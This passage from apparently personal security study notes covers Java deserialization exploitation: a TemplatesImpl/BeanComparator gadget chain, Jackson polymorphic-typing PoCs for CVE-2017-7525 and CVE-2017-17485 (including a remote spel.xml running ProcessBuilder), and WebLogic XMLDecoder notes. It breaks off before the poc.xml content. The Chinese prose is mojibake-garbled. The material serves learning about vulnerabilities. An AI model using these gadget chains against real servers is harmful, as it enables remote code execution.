<h2 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h2><p>æ˜¯é…åˆ<code>Fastjson</code>ã€<code>Jackson</code>ç¯å¢ƒä¸‹ä¸å‡ºç½‘åˆ©ç”¨çš„æ‰“æ³•</p>
<h3 id="C3P0-Hex"><a href="#C3P0-Hex" class="headerlink" title="C3P0_Hex"></a>C3P0_Hex</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.test;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">import static org.example.fj2.test.Tool.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Hex &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl obj = new TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;</span><br><span class="line">                payload(&quot;mate-calc&quot;).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, &quot;_name&quot;, &quot;Poria&quot;);</span><br><span class="line">        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, null&#125;);</span><br><span class="line"></span><br><span class="line">        run(queue, &quot;debug&quot;, &quot;hex&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h1><p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/189.html">cveå‚è€ƒ</a></p>
<p><strong>JacksonPolymorphicDeserialization</strong> å³ Jackson å¤šæ€ç±»å‹çš„ååºåˆ—åŒ–</p>
<p>å…¶å®ç°æœ‰ä¸¤ç§ï¼Œå³ <code>DefaultTyping</code> å’Œ <code>@JsonTypeInfo</code> æ³¨è§£ã€‚</p>
<h2 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h2><table>
<thead>
<tr>
<th>DefaultTypingç±»å‹</th>
<th>æè¿°è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_LANG_OBJECT</td>
<td>å±æ€§çš„ç±»å‹ä¸ºObject</td>
</tr>
<tr>
<td>OBJECT_AND_NON_CONCRETE</td>
<td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClass</td>
</tr>
<tr>
<td>NON_CONCRETE_AND_ARRAYS</td>
<td>å±æ€§çš„ç±»å‹ä¸ºObjectã€Interfaceã€AbstractClassã€Array</td>
</tr>
<tr>
<td>NON_FINAL</td>
<td>æ‰€æœ‰é™¤äº†å£°æ˜ä¸ºfinalä¹‹å¤–çš„å±æ€§</td>
</tr>
</tbody></table>
<p><strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œå³æ— å‚æ•°çš„ enableDefaultTyping æ˜¯ç¬¬äºŒä¸ªè®¾ç½®ï¼ŒOBJECT_AND_NON_CONCRETEã€‚</strong></p>
<h3 id="ä¸€-1"><a href="#ä¸€-1" class="headerlink" title="ä¸€"></a>ä¸€</h3><p><strong>JAVA_LANG_OBJECT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br></pre></td></tr></table></figure>

<p>enableDefaultTyping() è®¾ç½®è®¾ç½® JAVA_LANG_OBJECT åï¼Œä¼šå¤šè¾“å‡º Hacker ç±»åï¼Œä¸”åœ¨è¾“å‡ºçš„ Object å±æ€§æ—¶ç›´æ¥è¾“å‡ºçš„æ˜¯ Hacker ç±»å¯¹è±¡</p>
<h3 id="äºŒ-1"><a href="#äºŒ-1" class="headerlink" title="äºŒ"></a>äºŒ</h3><p><strong>OBJECT_AND_NON_CONCRETE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250301104130533.png?raw=true" alt="image-20250301104130533"></p>
<p>è¿™ä¸ªä¸åŠ ä¼šå¯¼è‡´ååºåˆ—åŒ–çš„æ—¶å€™ä»–åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯SexæŠ½è±¡ç±»ï¼Œè€Œä¸æ˜¯Mysex</p>
<h3 id="ä¸‰-1"><a href="#ä¸‰-1" class="headerlink" title="ä¸‰"></a>ä¸‰</h3><p><strong>NON_CONCRETE_AND_ARRAYS</strong>é™¤äº†å‰é¢æåˆ°çš„ç‰¹å¾å¤–ï¼Œè¿˜æ”¯æŒ Array ç±»å‹ã€‚</p>
<p>ç±»åå˜æˆäº† <code>â€[Lâ€+ç±»å+â€;â€</code>ï¼Œåºåˆ—åŒ– Object ä¹‹åä¸ºæ•°ç»„å½¢å¼ï¼Œååºåˆ—åŒ–ä¹‹åå¾—åˆ°<code>[Lcom.mi1k7ea.Hacker;</code></p>
<h3 id="å››-1"><a href="#å››-1" class="headerlink" title="å››"></a>å››</h3><p><strong>NON_FINAL</strong></p>
<p>NON_FINALï¼šé™¤äº†å‰é¢çš„æ‰€æœ‰ç‰¹å¾å¤–ï¼ŒåŒ…å«å³å°†è¢«åºåˆ—åŒ–çš„ç±»é‡Œçš„å…¨éƒ¨ã€é final çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ•´ä¸ªç±»ã€é™¤ final å¤–çš„å±æ€§ä¿¡æ¯éƒ½éœ€è¦è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<h2 id="JsonTypeInfo-æ³¨è§£"><a href="#JsonTypeInfo-æ³¨è§£" class="headerlink" title="@JsonTypeInfo æ³¨è§£"></a>@JsonTypeInfo æ³¨è§£</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)  </span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)</span><br></pre></td></tr></table></figure>

<h3 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h3><p>æ™®é€šç‰ˆ</p>
<h3 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h3><p>objectå±æ€§ä¸­å¤šäº† <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ï¼Œ</p>
<h3 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h3><p>å³ä½¿ç”¨ @c æ›¿ä»£äº† @classï¼Œå®˜æ–¹æè¿°ä¸­çš„æ„æ€æ˜¯ç¼©çŸ­äº†ç›¸å…³ç±»åï¼Œå®é™…æ•ˆæœå’Œ JsonTypeInfo.Id.CLASS ç±»ä¼¼</p>
<h3 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h3><p>object å±æ€§ä¸­å¤šäº† <code>&quot;@type&quot;:&quot;Hacker&quot;</code>ï¼Œä½†æ²¡æœ‰å…·ä½“çš„åŒ…ååœ¨å†…çš„ç±»åï¼Œå› æ­¤åœ¨åé¢çš„ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè®¾ç½®å€¼æ˜¯ä¸èƒ½è¢«ååºåˆ—åŒ–åˆ©ç”¨çš„ï¼š</p>
<h3 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h3><p>å…¶å®è¿™ä¸ªå€¼æ—¶æä¾›ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„æ„æ€ï¼Œæˆ‘ä»¬æ˜¯æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨çš„ï¼Œéœ€è¦æ‰‹åŠ¨å†™ä¸€ä¸ªè§£æå™¨æ‰èƒ½é…åˆä½¿ç”¨ï¼Œç›´æ¥è¿è¡Œä¼šæŠ›å‡ºå¼‚å¸¸ï¼š</p>
<h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p><strong>Jackson ååºåˆ—åŒ–çš„è¿‡ç¨‹å…¶å®å°±åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹ï¼Œç¬¬äºŒéƒ¨æ˜¯è®¾ç½®å®ä¾‹çš„å±æ€§å€¼ã€‚</strong></p>
<p><strong>åœ¨ Jackson ååºåˆ—åŒ–ä¸­ï¼Œè‹¥è°ƒç”¨äº† <code>enableDefaultTyping()</code> å‡½æ•°æˆ–ä½¿ç”¨ <code>@JsonTypeInfo</code> æ³¨è§£æŒ‡å®šååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„å±æ€§ä¸º <code>JsonTypeInfo.Id.CLASS</code> æˆ– <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥å±æ€§çš„ç±»çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ã€‚</strong></p>
<p><strong>å½“å±æ€§ç±»å‹ä¸º Object æ—¶ï¼Œå› ä¸º Object ç±»å‹æ˜¯ä»»æ„ç±»å‹çš„çˆ¶ç±»ï¼Œå› æ­¤æ‰©å¤§äº†æˆ‘ä»¬çš„æ”»å‡»é¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å‡ºåœ¨ç›®æ ‡æœåŠ¡ç«¯ç¯å¢ƒä¸­å­˜åœ¨çš„ä¸”æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•å­˜åœ¨æ¼æ´ä»£ç çš„ç±»å³å¯è¿›è¡Œæ”»å‡»åˆ©ç”¨ã€‚</strong></p>
<p>æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€å³å­˜åœ¨Jacksonååºåˆ—åŒ–æ¼æ´ï¼š</p>
<ul>
<li>è°ƒç”¨äº† <code>ObjectMapper.enableDefaultTyping()</code> å‡½æ•°ï¼›</li>
<li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li>
<li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li>
</ul>
<h2 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Jackson 2.6 ç³»åˆ— &lt; 2.6.7.1<br>Jackson 2.7 ç³»åˆ— &lt; 2.7.9.1<br>Jackson 2.8 ç³»åˆ— &lt; 2.8.8.1</p>
<p>æ‰“çš„ TemplatesImpl é“¾ï¼Œæ‰€ä»¥è¦æ±‚ JDK ç‰ˆæœ¬æ˜¯ 7u21 æˆ–è€… 8u20</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package jjjjackson.cve1;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line">import javax.xml.bind.DatatypeConverter;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class PoC &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(System.getProperty(&quot;java.version&quot;));</span><br><span class="line">        String exp = readClassStr(&quot;E:\\code\\fj\\fj2\\target\\classes\\jjjjackson\\cve1\\SimpleCalc.class&quot;);</span><br><span class="line">        String jsonInput = aposToQuotes(&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot; +</span><br><span class="line">                &quot;&#123;\n&quot; +</span><br><span class="line">                &quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;+exp+&quot;&#x27;],\n&quot; +</span><br><span class="line">                &quot;&#x27;transletName&#x27;:&#x27;drun1baby&#x27;,\n&quot; +</span><br><span class="line">                &quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot; +</span><br><span class="line">                &quot;&#125;\n&quot; +</span><br><span class="line">                &quot;]\n&quot; +</span><br><span class="line">                &quot;&#125;&quot;);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        Test test;</span><br><span class="line">        try &#123;</span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String aposToQuotes(String json)&#123;</span><br><span class="line">        return json.replace(&quot;&#x27;&quot;,&quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String readClassStr(String cls) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        File file = new File(cls);</span><br><span class="line">        FileInputStream fileInputStream = new FileInputStream(file);</span><br><span class="line">        byte[] bytes = new byte[(int) file.length()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        String base64Encoded = DatatypeConverter.printBase64Binary(bytes);</span><br><span class="line">        return base64Encoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250301140430922.png?raw=true" alt="image-20250301140430922"></p>
<h2 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h2><h3 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.2<br>Jackson 2.8ç³»åˆ— &lt; 2.8.11<br>Jackson 2.9ç³»åˆ— &lt; 2.9.4</p>
<h4 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package jjjjackson.cve1;</span><br><span class="line"></span><br><span class="line">import com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class cve2 &#123;</span><br><span class="line">    public static void main(String[] args)  &#123;</span><br><span class="line">        //CVE-2017-17485</span><br><span class="line">        String payload = &quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;;</span><br><span class="line">        ObjectMapper mapper = new ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        try &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="spel-xml"><a href="#spel-xml" class="headerlink" title="spel.xml"></a>spel.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;  </span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  </span><br><span class="line">       xsi:schemaLocation=&quot;  </span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;  </span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;  </span><br><span class="line">        &lt;constructor-arg value=&quot;calc&quot; /&gt;  </span><br><span class="line">        &lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;  </span><br><span class="line">    &lt;/bean&gt;  </span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<h1 id="yamlååºåˆ—åŒ–"><a href="#yamlååºåˆ—åŒ–" class="headerlink" title="yamlååºåˆ—åŒ–"></a>yamlååºåˆ—åŒ–</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a target="_blank" rel="noopener" href="https://tttang.com/archive/1591/">å‚è€ƒ</a></h2><p>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè§¦å‘setæ–¹æ³•å’Œæ„é€ æ–¹æ³•ã€‚</p>
<h1 id="Hessianååºåˆ—åŒ–"><a href="#Hessianååºåˆ—åŒ–" class="headerlink" title="Hessianååºåˆ—åŒ–"></a>Hessianååºåˆ—åŒ–</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">å‚è€ƒ</a></p>
<p>ç›¸è¾ƒäºåŸç”Ÿçš„ååºåˆ—åŒ–ï¼ŒHessianååºåˆ—åŒ–å ç”¨ç©ºé—´æ›´å°ã€‚</p>
<h1 id="Springæ ¸å¿ƒ"><a href="#Springæ ¸å¿ƒ" class="headerlink" title="Springæ ¸å¿ƒ"></a>Springæ ¸å¿ƒ</h1><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><p><strong>æ§åˆ¶åè½¬æ˜¯ä¸€ç§é€šè¿‡æè¿°ï¼ˆXMLæˆ–æ³¨è§£ï¼‰å¹¶é€šè¿‡ç¬¬ä¸‰æ–¹å»ç”Ÿäº§æˆ–è·å–ç‰¹å®šå¯¹è±¡çš„æ–¹å¼ã€‚åœ¨Springä¸­å®ç°æ§åˆ¶åè½¬çš„æ˜¯IoCå®¹å™¨ï¼Œå…¶å®ç°æ–¹æ³•æ˜¯ä¾èµ–æ³¨å…¥ï¼ˆDependency Injection,DIï¼‰ã€‚</strong></p>
<h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import DAO.MysqlUserDaoImpl;  </span><br><span class="line">import Service.UserServiceImpl;  </span><br><span class="line">import org.junit.Test;  </span><br><span class="line">import org.springframework.context.ApplicationContext;  </span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">public class TestApplication &#123;  </span><br><span class="line">    @Test  </span><br><span class="line"> public void TestApplication() &#123;  </span><br><span class="line">        // è·å–ApplicationContextï¼›æ‹¿åˆ°Springå®¹å™¨  </span><br><span class="line"> ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);  </span><br><span class="line">  </span><br><span class="line"> // éœ€è¦ä»€ä¹ˆå°±ç›´æ¥getä»€ä¹ˆï¼  </span><br><span class="line"> UserServiceImpl userServiceImpl = (UserServiceImpl) context.getBean(&quot;UserServiceImpl&quot;);  </span><br><span class="line"> userServiceImpl.getUser();  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="beans-xml"><a href="#beans-xml" class="headerlink" title="beans.xml"></a>beans.xml</h3><p>æœ‰ä¸‰ç§æ–¹å¼ç¼–å†™</p>
<h2 id="DIä¾èµ–æ³¨å…¥"><a href="#DIä¾èµ–æ³¨å…¥" class="headerlink" title="DIä¾èµ–æ³¨å…¥"></a>DIä¾èµ–æ³¨å…¥</h2><p>Setæ³¨å…¥</p>
<h2 id="C-På‘½åç©ºé—´"><a href="#C-På‘½åç©ºé—´" class="headerlink" title="C&#x2F;På‘½åç©ºé—´"></a>C&#x2F;På‘½åç©ºé—´</h2><p>éœ€è¦åœ¨å¤´æ–‡ä»¶ä¸­åŠ å…¥çº¦æŸæ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--P(å±æ€§: properties)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;</span><br><span class="line">&lt;bean id=&quot;user&quot; class=&quot;pojo.User&quot; p:name=&quot;Drunkbaby&quot; p:age=&quot;20&quot; /&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--C(æ„é€ : Constructor)å‘½åç©ºé—´ , å±æ€§ä¾ç„¶è¦è®¾ç½®setæ–¹æ³•--&gt;</span><br><span class="line">&lt;bean id=&quot;user&quot; class=&quot;com.example.pojo.User&quot; c:name=&quot;Drunkbaby&quot; c:age=&quot;20&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>**bean å°±æ˜¯ç”± IoC å®¹å™¨åˆå§‹åŒ–ã€è£…é…åŠç®¡ç†çš„å¯¹è±¡ **</p>
<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Oracle WebLogic Server</span><br><span class="line">10.3.6.0, </span><br><span class="line">12.1.3.0,</span><br><span class="line">12.2.1.2 </span><br><span class="line">and 12.2.1.3ã€‚</span><br></pre></td></tr></table></figure>

<p>t3ä¼ªåè®®å¥—ä¸Šcc1é“¾å­</p>
<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>ç»•è¿‡ç”± <code>ServerChannelInputStream</code> æ¢åˆ°äº†è‡ªèº«çš„ <code>ReadExternal#InputStream</code></p>
<h2 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h2><p>xmlenocde&#x2F;decode</p>
<h3 id="å½±å“-1"><a href="#å½±å“-1" class="headerlink" title="å½±å“"></a>å½±å“</h3><p>Oracle WebLogic Server </p>
<p>10.3.6.0.0,</p>
<p> 12.1.3.0.0, </p>
<p>12.2.1.3.0, </p>
<p>12.2.1.4.0, </p>
<p>14.1.1.0.0ã€‚</p>
<h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>main</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package xml;</span><br><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line">public class XMLDecoderEvilDemo &#123;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    FileInputStream file = new FileInputStream(&quot;poc.xml&quot;);</span><br><span class="line">    XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file));</span><br><span class="line">    Object result = xmlDecoder.readObject();</span><br><span class="line">    xmlDecoder.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc.xml</p>
